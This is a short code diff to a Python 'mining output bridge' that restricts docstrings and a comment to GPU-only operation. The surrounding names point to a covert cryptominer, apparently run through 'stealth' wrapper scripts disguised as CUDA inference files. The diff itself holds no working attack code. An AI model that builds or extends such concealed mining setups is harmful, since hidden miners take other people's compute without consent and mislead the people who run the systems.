@@ -30,7 +30,7 @@ def create_mining_output_forwarder(process_type: str, target_pid: int):
     Tạo forwarder để capture mining output thật và forward tới PID Logger
     
     Args:
-        process_type: 'cpu' hoặc 'gpu'
+        process_type: 'gpu' only
         target_pid: PID của mining process cần monitor
     """
     logger.info(f"🔗 Creating mining output forwarder for {process_type} PID {target_pid}")
@@ -91,7 +91,7 @@ def inject_output_capture(process_type: str, wrapper_script_path: str):
     Inject output capture vào stealth wrapper script
     
     Args:
-        process_type: 'cpu' hoặc 'gpu'  
+        process_type: 'gpu' only  
         wrapper_script_path: Đường dẫn tới stealth wrapper script
     """
     logger.info(f"🔧 Injecting output capture into {wrapper_script_path}")
@@ -183,7 +183,7 @@ def main():
     """Main function để setup mining output bridge"""
     logger.info("🚀 Starting Mining Output Bridge")
     
-    # Setup forwarders cho GPU-only (CPU wrapper removed)
+    # Setup forwarders cho GPU-only
     gpu_wrapper = "/app/mining_environment/stealth/wrappers/stealth_inference_cuda.py"
     
     # Inject output capture vào GPU stealth wrapper
